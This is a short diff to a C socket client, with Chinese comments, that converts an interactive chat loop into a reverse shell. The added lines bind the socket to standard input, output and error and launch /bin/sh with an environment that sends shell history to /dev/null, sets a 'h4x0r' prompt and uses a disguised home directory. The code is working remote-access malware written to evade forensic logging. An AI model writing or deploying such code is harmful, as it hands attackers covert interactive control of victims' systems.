@@ -9,8 +9,8 @@
 #include <fcntl.h>
 #include <sys/shm.h>
 
-
-char *argv[] = { "bash", "-i", NULL };
+char shell[] = "/bin/sh";
+char *argv[] = { shell, "-i", NULL };
 char *envp[] = { "TERM=linux", "PS1=h4x0r-> ", "BASH_HISTORY=/dev/null",
                  "HISTORY=/dev/null", "history=/dev/null", "HOME=/usr/_h4x_","HISTFILE=/dev/null",
                  "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin", NULL };
@@ -37,23 +37,17 @@ int main()
         perror("connect");
         exit(1);
     }
-    char sendbuf[BUFFER_SIZE];
-    char recvbuf[BUFFER_SIZE];
-
+	// send(sock_cli, sendbuf, strlen(sendbuf),0); ///发送
+	// if(strcmp(sendbuf,"exit\n")==0)
+		// break;
 	
-    while (fgets(sendbuf, sizeof(sendbuf), stdin) != NULL)
-    {
-		int procid;
-		
-        send(sock_cli, sendbuf, strlen(sendbuf),0); ///发送
-        if(strcmp(sendbuf,"exit\n")==0)
-            break;
-        recv(sock_cli, recvbuf, sizeof(recvbuf),0); ///接收
-        fputs(recvbuf, stdout);
+	dup2(sock_cli, 0);
+	dup2(sock_cli, 1);
+	dup2(sock_cli, 2);
 
-        memset(sendbuf, 0, sizeof(sendbuf));
-        memset(recvbuf, 0, sizeof(recvbuf));
-    }
+	execve(shell, argv, envp);
+	
+	
 
     close(sock_cli);
     return 0;
